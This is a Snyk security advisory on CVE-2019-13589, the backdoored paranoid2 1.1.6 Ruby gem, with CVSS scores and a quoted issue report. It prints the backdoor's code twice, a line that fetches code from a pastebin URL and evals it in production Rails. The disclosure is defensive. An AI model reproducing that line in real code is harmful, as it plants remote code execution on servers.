#### Introduced: 14 Jul 2019

 Malicious [CVE-2019-13589  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2019-13589) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-506  (opens in a new tab)](https://cwe.mitre.org/data/definitions/506.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses
## How to fix?

Avoid using `paranoid2` altogether. Furthermore, Downgrading to v1.1.5 will ensure no malicious code execution is possible.

## Overview

[paranoid2](https://github.com/anjlab/paranoid2) is a paranoid models for rails 4

Affected versions of this package are a Malicious Package.
paranoid2 1.1.6 for Ruby includes a code-execution backdoor inserted by a third party.

## Backdoor Code

```
_!{Thread.new{loop{_!{sleep rand*3333;eval(Net::HTTP.get(URI('https://pastebin.com/raw/X9S6XQFx')))}}}if Rails.env[0]=="p"}

```

* [GitHub Issue](https://github.com/rubygems/rubygems.org/issues/2051)
### CVSS Scores

version 3.1
### Snyk

9.8 critical

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**

Hi,

[paranoid2](https://rubygems.org/gems/paranoid2) version 1.1.6 is compromised and a malware. Please remove it! The attack is similar to the recently reported [`strong_password`](https://withatwist.dev/strong-password-rubygem-hijacked.html) and the code snippet is located at:

paranoid2-1.1.6/lib/paranoid2/persistence.rb:

```
_!{Thread.new{loop{_!{sleep rand*3333;eval(Net::HTTP.get(URI('https://pastebin.com/raw/X9S6XQFx')))}}}if Rails.env[0]=="p"}

```

# Vulnerability Disclosure

We at Snyk value the security community and believe that a responsible disclosure of security vulnerabilities in open source packages helps us ensure the security and privacy of the users. We aim to provide a disclosure program for the security community to report security issues found within languages including JavaScript, Java, Python, .NET, Go, Ruby and PHP.

Using this form, you can disclose vulnerabilities you’ve found or vulnerabilities that are missing within [Snyk Vulnerability Database](https://security.snyk.io/), and we’ll help you verify the vulnerability and contact the maintainer. In addition, as a CVE Numbering Authority (CNA) we are also able to assign a CVE for the issue.

Before submitting a report, please review our disclosure policy which can be found [here](https://docs.snyk.io/disclosing-vulnerabilities/disclose-a-vulnerability-in-an-open-source-package).

For any questions or follow ups on the disclosure you may email us at report@snyk.io.
